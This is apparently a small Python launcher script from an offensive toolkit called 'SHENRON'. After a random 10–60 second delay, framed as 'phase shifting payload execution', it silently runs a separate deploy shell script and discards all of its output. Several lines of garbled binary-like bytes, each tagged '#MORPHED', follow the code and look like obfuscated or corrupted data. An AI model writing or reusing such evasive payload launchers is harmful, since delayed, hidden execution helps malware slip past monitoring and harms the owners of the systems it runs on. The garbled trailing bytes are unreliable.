#!/usr/bin/env python3
import os
import random
import subprocess
import time

def random_phase_shift():
    delay = random.randint(10, 60)
    print(f"[~] Phase shifting payload execution by {delay}s...")
    time.sleep(delay)

def temporal_phase(command):
    random_phase_shift()
    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[âœ“] Temporal phase executed and vanished.")

if __name__ == "__main__":
    temporal_phase("bash ~/SHENRON/shenron_deploy_master.sh")

—8‡eÂ‹‡qÑÚÕg)ëÃÕ#MORPHED

Œ°´ë\Ú•<YMB½­ôÙ~WkbYòŸ´Öq0\@%t£‚ïè;­áÀöõ#MORPHED

k-Ş­­¶8BÁÈ¥_VÔ-ª ¥3‘^»A¯°#MORPHED

¼{{¨¨š¨À5µV®~¸ñ7¸±#MORPHED
